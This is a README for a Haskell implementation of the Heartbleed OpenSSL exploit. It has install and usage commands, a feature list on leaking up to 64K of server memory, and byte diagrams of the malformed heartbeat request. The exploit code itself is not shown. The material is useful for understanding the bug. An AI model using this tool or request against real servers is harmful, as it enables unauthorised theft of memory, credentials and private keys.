haskell-heartbleed: Implementation of OpenSSL Heartbeat bug exploit in Haskell
==============================================================================

Requirements and Insallation
----------------------------

This program depends on a couple packages, besides GHC of course:

* `Options <http://hackage.haskell.org/package/options>`_ - for argument parsing
* `Repa <http://hackage.haskell.org/package/repa>`_ - for searching through
memory chunks in parallel.
* `tls (customized) <https://github.com/lehins/hs-tls>`_ - version of
`tls <http://hackage.haskell.org/package/tls>`_ library with hearbeat feature added
to it.

Here is installation and compilation instructions (llvm is required for Repa):

.. code-block:: bash

   ~$ sudo apt-get update && sudo apt-get install llvm
   ~$ cabal update && cabal install Options repa
   ~$ git clone https://github.com/lehins/hs-tls
   ~$ cd hs-tls/core
   ~/hs-tls/core$ cabal install
   ~/hs-tls/core$ cd ..
   ~$ rm -R hs-tls
   ~$ git clone https://github.com/lehins/haskell-heartbleed
   ~$ cd haskell-heartbleed
   ~/haskell-heartbleed$ make
   ~/haskell-heartbleed$ ./heartbleed --help                

Example Usage
-------------

.. code-block:: bash
     
   $ ./heartbleed --host example.com --times 10 +RTS -N

Features
--------

Can extract up to 64K of random memory from a server running vulnerable version
of OpenSSL. Unlike most heartbleed implementations, all requests and responses
are transmitted over encrypted TLS connection. Moreover, same TLS connection is
reused for heartbeat requests, until it is dropped by the server, in which case
it is automatically reestablished. Making this implementation blazingly fast.

Still working on ability to retreive private keys from the memory chunks.                

Overview of Heartbeat Request
-----------------------------

Legitimate request and response::

                             _ Size of the payload  _Payload "foo"
    Request__               /                ______/
             \             /                /
    (..) [0x01] [0x00 0x03] [0x66 0x6F 0x6F] [at least 16 bytes random padding] 

    Response_
             \
    (..) [0x02] [0x00 0x03] [0x66 0x6F 0x6F] [at least 16 bytes other random padding] 

Request that exploits the bug, requesting 64K of memory from the server, notice
missing padding::
     
    
       _ Heartbeat      _TLS v1.0   _Message size  _Heartbeat Request  _Payload Size
      /                /           /      ________/   ________________/
     /                /           /      /           /
    [0x18] [0x03 0x01] [0x00 0x03] [0x01] [0xFF 0xFF]


Disclaimer
----------

This program was written for educational purpose only. Pointing this program at
any computer without prior agreement can be considered illegal and might cause
legal action, prosecution, fines and/or imprisonment. Use it at your own risk.
